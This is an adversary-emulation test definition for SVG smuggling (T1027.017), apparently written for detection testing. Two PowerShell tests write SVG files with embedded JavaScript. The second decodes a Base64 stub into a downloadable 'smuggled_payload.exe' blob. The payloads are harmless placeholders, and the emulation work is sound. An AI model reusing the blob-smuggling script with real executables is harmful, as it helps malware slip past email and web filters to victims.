attack_technique: T1027.017
display_name: "Obfuscated Files or Information: SVG Smuggling"

atomic_tests:
  - name: T1027.017 - Inline JavaScript via Embedded SVG Script Element
    auto_generated_guid: de3ac2f1-41e7-411a-be75-2ba35354d181
    description: |
      Constructs a standard SVG graphic containing an embedded inline <script> element.
    supported_platforms:
      - windows
    executor:
      name: powershell
      elevation_required: false
      command: |
        $svgPath = "$env:TEMP\T1027_017_script_element.svg"
        $svgContent = @"
        <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
          <circle cx="100" cy="100" r="80" fill="blue" />
          <script type="text/javascript">
            var payload = "SVG_Smuggling_Test_Active";
            console.log(payload);
          </script>
        </svg>
        "@
        [System.IO.File]::WriteAllText($svgPath,$svgContent)
        Write-Host "[+] Generated SVG file at: $svgPath"
      cleanup_command: |
        Remove-Item "$env:TEMP\T1027_017_script_element.svg" -Force -ErrorAction SilentlyContinue

  - name: T1027.017 - Base64 Blob Payload Assembly via SVG JavaScript
    auto_generated_guid: f976dbcb-d75b-4db8-9bc9-0dadbed2a132
    description: |
      Embeds a Base64-encoded string inside an SVG script that creates a binary Blob download.
    supported_platforms:
      - windows
    executor:
      name: powershell
      elevation_required: false
      command: |
        $svgPath = "$env:TEMP\T1027_017_base64_blob.svg"
        $svgContent = @"
        <svg xmlns="http://www.w3.org/2000/svg">
          <script type="text/javascript">
            var b64Payload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA==";
            var byteCharacters = atob(b64Payload);
            var byteNumbers = new Array(byteCharacters.length);
            for (var i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            var byteArray = new Uint8Array(byteNumbers);
            var blob = new Blob([byteArray], {type: "application/octet-stream"});
            var link = document.createElement("a");
            link.href = window.URL.createObjectURL(blob);
            link.download = "smuggled_payload.exe";
          </script>
        </svg>
        "@
        [System.IO.File]::WriteAllText($svgPath,$svgContent)
        Write-Host "[+] Generated Base64 Blob SVG at: $svgPath"
      cleanup_command: |
        Remove-Item "$env:TEMP\T1027_017_base64_blob.svg" -Force -ErrorAction SilentlyContinue

